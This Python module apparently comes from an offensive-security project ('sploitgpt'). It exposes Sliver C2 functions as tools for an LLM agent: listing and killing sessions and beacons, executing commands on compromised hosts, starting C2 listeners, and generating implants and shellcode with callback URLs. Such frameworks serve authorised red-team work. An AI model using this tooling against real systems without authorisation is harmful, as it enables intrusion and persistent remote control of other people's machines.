"""
Sliver C2 Tools

Tools for interacting with Sliver C2 server via gRPC.
These tools allow the LLM agent to manage sessions, beacons,
listeners, and execute commands on compromised hosts.
"""

import asyncio
import logging
from typing import Any

from sploitgpt.tools import register_tool

logger = logging.getLogger(__name__)

# Shared Sliver client instance
_sliver_client = None
_sliver_lock = asyncio.Lock()


def _sliver_unavailable_error() -> str:
    return (
        "Error: could not connect to Sliver server. "
        "Check that the Sliver container is running and the operator config exists at "
        "SPLOITGPT_SLIVER_CONFIG (or configs/sliver/sploitgpt.cfg)."
    )


async def _get_sliver_client():
    """Get or create shared Sliver client instance."""
    global _sliver_client

    async with _sliver_lock:
        if _sliver_client is not None and _sliver_client.is_connected:
            return _sliver_client

        from sploitgpt.sliver import SliverRPC

        _sliver_client = SliverRPC()
        return _sliver_client


async def _connect_sliver_with_retry(sliver, max_attempts: int = 3, delay_s: float = 1.0) -> bool:
    """Attempt to connect to Sliver with retries."""
    if sliver.is_connected:
        return True

    for attempt in range(max_attempts):
        if await sliver.connect(quiet=True):
            return True
        if attempt < max_attempts - 1:
            await asyncio.sleep(delay_s)

    return False


# =============================================================================
# Session & Beacon Management
# =============================================================================


@register_tool("sliver_sessions")
async def sliver_sessions() -> str:
    """List active Sliver sessions and beacons.

    Sessions are real-time interactive connections.
    Beacons are asynchronous check-in implants.
    """
    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        sessions = await sliver.list_sessions()
        beacons = await sliver.list_beacons()

        # Echo to viewer
        try:
            from sploitgpt.sliver.viewer import echo_sessions

            echo_sessions(sessions, beacons)
        except Exception:
            pass

        if not sessions and not beacons:
            return "No active Sliver sessions or beacons."

        lines = []

        if sessions:
            lines.append(f"**Sessions ({len(sessions)}):**")
            lines.append("")
            for s in sessions:
                lines.append(f"  `{s.id[:8]}...` - **{s.name}**")
                lines.append(f"    Host: {s.username}@{s.hostname}")
                lines.append(f"    OS: {s.os}/{s.arch} | PID: {s.pid}")
                lines.append(f"    Transport: {s.transport}")
                lines.append("")

        if beacons:
            lines.append(f"**Beacons ({len(beacons)}):**")
            lines.append("")
            for b in beacons:
                lines.append(f"  `{b.id[:8]}...` - **{b.name}**")
                lines.append(f"    Host: {b.username}@{b.hostname}")
                lines.append(f"    OS: {b.os}/{b.arch} | PID: {b.pid}")
                lines.append(f"    Interval: {b.interval}s | Jitter: {b.jitter}%")
                lines.append("")

        return "\n".join(lines).strip()

    except Exception as e:
        logger.exception("Error listing Sliver sessions")
        return f"Error: {e}"


@register_tool("sliver_use")
async def sliver_use(target_id: str) -> str:
    """Select a session or beacon for interaction.

    Args:
        target_id: Session or beacon ID (can be partial, e.g., first 8 chars)

    Returns information about the selected target.
    """
    target_id = (target_id or "").strip()
    if not target_id:
        return "Error: provide a session or beacon ID"

    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        # Try to find matching session or beacon
        sessions = await sliver.list_sessions()
        beacons = await sliver.list_beacons()

        # Check sessions first
        for s in sessions:
            if s.id.startswith(target_id) or s.id == target_id:
                return f"""**Selected Session: {s.name}**

ID: `{s.id}`
Host: {s.username}@{s.hostname}
OS: {s.os}/{s.arch}
PID: {s.pid}
Transport: {s.transport}
Remote Address: {s.remote_address}

Use `sliver_execute` to run commands on this session."""

        # Check beacons
        for b in beacons:
            if b.id.startswith(target_id) or b.id == target_id:
                return f"""**Selected Beacon: {b.name}**

ID: `{b.id}`
Host: {b.username}@{b.hostname}
OS: {b.os}/{b.arch}
PID: {b.pid}
Transport: {b.transport}
Check-in Interval: {b.interval}s (±{b.jitter}% jitter)

Note: Beacon commands are queued and execute on next check-in.
Use `sliver_execute` to queue commands."""

        return f"No session or beacon found matching '{target_id}'"

    except Exception as e:
        logger.exception("Error selecting Sliver target")
        return f"Error: {e}"


@register_tool("sliver_execute")
async def sliver_execute(
    target_id: str,
    command: str,
    args: list[str] | None = None,
) -> str:
    """Execute a command on a Sliver session or beacon.

    Args:
        target_id: Session or beacon ID
        command: Command/binary to execute (e.g., "/bin/ls", "whoami")
        args: Optional list of arguments

    For sessions: Returns output immediately.
    For beacons: Queues task, returns on next check-in.
    """
    target_id = (target_id or "").strip()
    command = (command or "").strip()

    if not target_id:
        return "Error: provide a session or beacon ID"
    if not command:
        return "Error: provide a command to execute"

    args = args or []

    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        # Echo to viewer
        try:
            from sploitgpt.sliver.viewer import echo_execute

            echo_execute(target_id, command, args)
        except Exception:
            pass

        # Find the target (session or beacon)
        sessions = await sliver.list_sessions()
        beacons = await sliver.list_beacons()

        # Try session first
        for s in sessions:
            if s.id.startswith(target_id) or s.id == target_id:
                interact = await sliver.interact_session(s.id)
                if not interact:
                    return f"Failed to interact with session {s.id}"

                result = await interact.execute(command, args, output=True)

                stdout = ""
                stderr = ""
                if result.Stdout:
                    stdout = result.Stdout.decode("utf-8", errors="replace")
                if result.Stderr:
                    stderr = result.Stderr.decode("utf-8", errors="replace")

                # Echo output to viewer
                try:
                    from sploitgpt.sliver.viewer import echo_output

                    echo_output(stdout or stderr or "(no output)")
                except Exception:
                    pass

                output = []
                if stdout:
                    output.append(stdout)
                if stderr:
                    output.append(f"[stderr]\n{stderr}")

                return "\n".join(output) if output else "(no output)"

        # Try beacon
        for b in beacons:
            if b.id.startswith(target_id) or b.id == target_id:
                interact = await sliver.interact_beacon(b.id)
                if not interact:
                    return f"Failed to interact with beacon {b.id}"

                # Beacon commands return a task that completes on check-in
                task = await interact.execute(command, args, output=True)

                return f"""Task queued for beacon {b.name} (ID: {b.id[:8]}...)

The beacon checks in every {b.interval}s (±{b.jitter}% jitter).
Results will be available after next check-in.

Task ID: {task.TaskID if hasattr(task, "TaskID") else "pending"}"""

        return f"No session or beacon found matching '{target_id}'"

    except Exception as e:
        logger.exception("Error executing Sliver command")
        return f"Error: {e}"


@register_tool("sliver_kill")
async def sliver_kill(target_id: str, force: bool = False) -> str:
    """Kill a Sliver session or beacon.

    Args:
        target_id: Session or beacon ID to kill
        force: Force kill (for sessions)
    """
    target_id = (target_id or "").strip()
    if not target_id:
        return "Error: provide a session or beacon ID to kill"

    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        sessions = await sliver.list_sessions()
        beacons = await sliver.list_beacons()

        # Try session
        for s in sessions:
            if s.id.startswith(target_id) or s.id == target_id:
                success = await sliver.kill_session(s.id, force=force)
                if success:
                    return f"Session {s.name} ({s.id[:8]}...) killed."
                return f"Failed to kill session {s.id}"

        # Try beacon
        for b in beacons:
            if b.id.startswith(target_id) or b.id == target_id:
                success = await sliver.kill_beacon(b.id)
                if success:
                    return f"Beacon {b.name} ({b.id[:8]}...) removed."
                return f"Failed to remove beacon {b.id}"

        return f"No session or beacon found matching '{target_id}'"

    except Exception as e:
        logger.exception("Error killing Sliver target")
        return f"Error: {e}"


# =============================================================================
# Listener/Job Management
# =============================================================================


@register_tool("sliver_listeners")
async def sliver_listeners() -> str:
    """List active Sliver listeners (jobs).

    Shows all running C2 listeners (mTLS, HTTP, HTTPS, DNS, etc.)
    """
    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        jobs = await sliver.list_jobs()

        # Echo to viewer
        try:
            from sploitgpt.sliver.viewer import echo_jobs

            echo_jobs(jobs)
        except Exception:
            pass

        if not jobs:
            return "No active Sliver listeners."

        lines = [f"**Active Listeners ({len(jobs)}):**", ""]

        for j in jobs:
            lines.append(f"  Job #{j.id}: **{j.name}**")
            lines.append(f"    Protocol: {j.protocol} | Port: {j.port}")
            if j.domains:
                lines.append(f"    Domains: {', '.join(j.domains)}")
            lines.append("")

        return "\n".join(lines).strip()

    except Exception as e:
        logger.exception("Error listing Sliver listeners")
        return f"Error: {e}"


@register_tool("sliver_start_listener")
async def sliver_start_listener(
    protocol: str,
    host: str = "0.0.0.0",
    port: int = 0,
    domain: str = "",
    persistent: bool = False,
) -> str:
    """Start a Sliver C2 listener.

    Args:
        protocol: Listener type - "mtls", "http", "https", or "dns"
        host: Interface to bind (default: 0.0.0.0)
        port: Port to listen on (0 = use default for protocol)
        domain: Domain name (required for DNS, optional for HTTP/S)
        persistent: Restart listener on server restart

    Default ports: mTLS=8888, HTTP=80, HTTPS=443, DNS=53
    """
    protocol = (protocol or "").strip().lower()
    host = (host or "0.0.0.0").strip()
    domain = (domain or "").strip()

    valid_protocols = ["mtls", "http", "https", "dns"]
    if protocol not in valid_protocols:
        return f"Error: protocol must be one of: {', '.join(valid_protocols)}"

    # Default ports
    default_ports = {"mtls": 8888, "http": 80, "https": 443, "dns": 53}
    if port <= 0:
        port = default_ports.get(protocol, 8888)

    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        result = None

        if protocol == "mtls":
            result = await sliver.start_mtls_listener(host=host, port=port, persistent=persistent)
        elif protocol == "http":
            result = await sliver.start_http_listener(
                host=host, port=port, domain=domain, persistent=persistent
            )
        elif protocol == "https":
            result = await sliver.start_https_listener(
                host=host, port=port, domain=domain, persistent=persistent
            )
        elif protocol == "dns":
            if not domain:
                return "Error: DNS listener requires a domain (--domain)"
            result = await sliver.start_dns_listener(
                domains=[domain], host=host, port=port, persistent=persistent
            )

        if result and "job_id" in result:
            # Echo to viewer
            try:
                from sploitgpt.sliver.viewer import echo_listener_started

                echo_listener_started(result["job_id"], protocol.upper(), host, port)
            except Exception:
                pass

            return f"""**Listener Started**

Protocol: {protocol.upper()}
Job ID: {result["job_id"]}
Binding: {host}:{port}
{f"Domain: {domain}" if domain else ""}
Persistent: {persistent}

Implants can now connect to this listener."""

        return f"Failed to start {protocol} listener"

    except Exception as e:
        logger.exception("Error starting Sliver listener")
        return f"Error: {e}"


@register_tool("sliver_stop_listener")
async def sliver_stop_listener(job_id: int) -> str:
    """Stop a Sliver listener by job ID.

    Args:
        job_id: Job ID of the listener to stop
    """
    try:
        job_id_int = int(job_id)
    except (TypeError, ValueError):
        return "Error: job_id must be an integer"

    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        success = await sliver.kill_job(job_id_int)
        if success:
            return f"Listener (job #{job_id_int}) stopped."
        return f"Failed to stop job #{job_id_int}"

    except Exception as e:
        logger.exception("Error stopping Sliver listener")
        return f"Error: {e}"


# =============================================================================
# Implant Generation
# =============================================================================


@register_tool("sliver_generate")
async def sliver_generate(
    os: str = "linux",
    arch: str = "amd64",
    c2_url: str = "",
    is_beacon: bool = False,
    beacon_interval: int = 60,
    beacon_jitter: int = 30,
    format: str = "EXECUTABLE",
    name: str = "",
    save_path: str = "",
) -> str:
    """Generate a Sliver implant.

    Args:
        os: Target OS - "linux", "windows", or "darwin"
        arch: Architecture - "amd64", "386", or "arm64"
        c2_url: C2 callback URL (e.g., "mtls://10.0.0.1:8888")
        is_beacon: Generate beacon (async) vs session (interactive)
        beacon_interval: Beacon check-in interval in seconds (default: 60)
        beacon_jitter: Beacon jitter percentage 0-100 (default: 30)
        format: Output format - "EXECUTABLE", "SHARED_LIB", "SERVICE", "SHELLCODE"
        name: Implant name (auto-generated if empty)
        save_path: Path to save implant (downloads if empty)

    Returns:
        Information about the generated implant.
    """
    os_target = (os or "linux").strip().lower()
    arch = (arch or "amd64").strip().lower()
    c2_url = (c2_url or "").strip()
    format = (format or "EXECUTABLE").strip().upper()
    name = (name or "").strip()
    save_path = (save_path or "").strip()

    valid_os = ["linux", "windows", "darwin"]
    valid_arch = ["amd64", "386", "arm64"]
    valid_format = ["EXECUTABLE", "SHARED_LIB", "SERVICE", "SHELLCODE"]

    if os_target not in valid_os:
        return f"Error: os must be one of: {', '.join(valid_os)}"
    if arch not in valid_arch:
        return f"Error: arch must be one of: {', '.join(valid_arch)}"
    if format not in valid_format:
        return f"Error: format must be one of: {', '.join(valid_format)}"

    if not c2_url:
        return "Error: c2_url is required (e.g., 'mtls://10.0.0.1:8888')"

    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        # Generate implant
        implant_data = await sliver.generate_implant(
            os=os_target,
            arch=arch,
            format=format,
            c2_url=c2_url,
            is_beacon=is_beacon,
            beacon_interval=beacon_interval,
            beacon_jitter=beacon_jitter,
            name=name,
            timeout=360,  # Generation can take a while
        )

        if not implant_data:
            return "Failed to generate implant (no data returned)"

        implant_size = len(implant_data)
        implant_type = "Beacon" if is_beacon else "Session"

        # Echo to viewer
        try:
            from sploitgpt.sliver.viewer import echo_implant_generated

            echo_implant_generated(name or "generated", os_target, arch, is_beacon)
        except Exception:
            pass

        # Save to file if path provided
        if save_path:
            from pathlib import Path

            save_file = Path(save_path)
            save_file.parent.mkdir(parents=True, exist_ok=True)
            save_file.write_bytes(implant_data)

            return f"""**Implant Generated**

Type: {implant_type}
OS/Arch: {os_target}/{arch}
Format: {format}
Size: {implant_size:,} bytes
C2: {c2_url}
{f"Interval: {beacon_interval}s (±{beacon_jitter}%)" if is_beacon else ""}

Saved to: {save_path}"""

        # Return info without saving (caller must handle bytes)
        return f"""**Implant Generated**

Type: {implant_type}
OS/Arch: {os_target}/{arch}
Format: {format}
Size: {implant_size:,} bytes
C2: {c2_url}
{f"Interval: {beacon_interval}s (±{beacon_jitter}%)" if is_beacon else ""}

Use save_path parameter to save the implant to disk."""

    except Exception as e:
        logger.exception("Error generating Sliver implant")
        return f"Error: {e}"


@register_tool("sliver_profiles")
async def sliver_profiles() -> str:
    """List saved implant profiles.

    Profiles are pre-configured implant templates.
    """
    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        profiles = await sliver.implant_profiles()

        if not profiles:
            return "No saved implant profiles."

        lines = [f"**Implant Profiles ({len(profiles)}):**", ""]

        for p in profiles:
            config = p.get("config", {})
            lines.append(f"  **{p['name']}**")
            lines.append(f"    OS/Arch: {config.get('goos', '?')}/{config.get('goarch', '?')}")
            lines.append(f"    Type: {'Beacon' if config.get('is_beacon') else 'Session'}")
            c2_list = config.get("c2", [])
            if c2_list:
                lines.append(f"    C2: {c2_list[0].get('url', '?')}")
            lines.append("")

        return "\n".join(lines).strip()

    except Exception as e:
        logger.exception("Error listing Sliver profiles")
        return f"Error: {e}"


# =============================================================================
# Server Info
# =============================================================================


@register_tool("sliver_version")
async def sliver_version() -> str:
    """Get Sliver server version and operator information."""
    try:
        sliver = await _get_sliver_client()
        if not await _connect_sliver_with_retry(sliver):
            return _sliver_unavailable_error()

        version = await sliver.version()
        operators = await sliver.operators()

        lines = [
            "**Sliver Server**",
            "",
            f"Version: {version['major']}.{version['minor']}.{version['patch']}",
            f"Commit: {version.get('commit', 'N/A')[:8]}",
            f"Compiled: {version.get('compiled_at', 'N/A')}",
            f"Server OS: {version.get('os', '?')}/{version.get('arch', '?')}",
            "",
            f"**Operators ({len(operators)}):**",
        ]

        for op in operators:
            status = "online" if op["online"] else "offline"
            lines.append(f"  - {op['name']} ({status})")

        return "\n".join(lines)

    except Exception as e:
        logger.exception("Error getting Sliver version")
        return f"Error: {e}"
